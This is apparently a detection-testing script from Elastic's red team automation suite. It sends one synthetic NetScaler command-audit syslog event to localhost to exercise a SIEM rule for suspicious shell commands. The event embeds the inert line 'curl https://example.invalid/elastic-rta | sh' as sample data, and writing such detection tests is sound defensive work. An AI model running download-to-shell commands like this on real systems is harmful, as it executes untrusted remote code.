# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: NetScaler Suspicious Shell Command in Audit Event
# RTA: execution_netscaler_suspicious_shell_command_audit.py
# Description: Sends one synthetic native NetScaler CMD_EXECUTED syslog event
#              containing inert download-to-shell command text. The Citrix ADC
#              integration parses the text into process.command_line. No shell
#              command, download, or NetScaler operation is executed.
#
#              This RTA does not require a NetScaler appliance. It must run on a
#              host where Elastic Agent's Citrix ADC integration listens for UDP
#              syslog on the default localhost port 9521.

import logging
import socket
from datetime import UTC, datetime

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)

SYSLOG_HOST = "127.0.0.1"
SYSLOG_PORT = 9521
SYSLOG_PRI = 134

APPLIANCE_HOSTNAME = "rta-netscaler"
EVENT_ID = 990004
REMOTE_IP = "192.0.2.10"
USER = "rta-admin"
COMMAND = "shell curl https://example.invalid/elastic-rta | sh"


def _build_cmd_executed_message(now: datetime) -> bytes:
    """Build a native NetScaler CLI CMD_EXECUTED syslog record."""
    native_time = now.strftime("%m/%d/%Y:%H:%M:%S")
    message = (
        f"<{SYSLOG_PRI}> {native_time} GMT {APPLIANCE_HOSTNAME} 0-PPE-0 : "
        f"default CLI CMD_EXECUTED {EVENT_ID} 0 : "
        f'User {USER} - ADM_User NONE - Remote_ip {REMOTE_IP} - '
        f'Command "{COMMAND}" - Status "Success"'
    )
    return message.encode()


@register_code_rta(
    id="4a10ce6f-b882-4b09-94e4-bcc838ff4d76",
    name="execution_netscaler_suspicious_shell_command_audit",
    platforms=[OSType.WINDOWS, OSType.LINUX, OSType.MACOS],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="09929fd6-d50d-46d5-9fc1-afae60de9326",
            name="NetScaler Suspicious Shell Command in Audit Event",
        )
    ],
    techniques=["T1059", "T1059.004"],
)
def main() -> None:
    """Send one synthetic NetScaler command-audit event."""
    event = _build_cmd_executed_message(datetime.now(UTC))
    log.info(
        "Sending synthetic NetScaler CMD_EXECUTED event %d to %s:%d",
        EVENT_ID,
        SYSLOG_HOST,
        SYSLOG_PORT,
    )

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        _ = sock.sendto(event, (SYSLOG_HOST, SYSLOG_PORT))

    log.info("Sent CMD_EXECUTED event containing inert shell-command text")
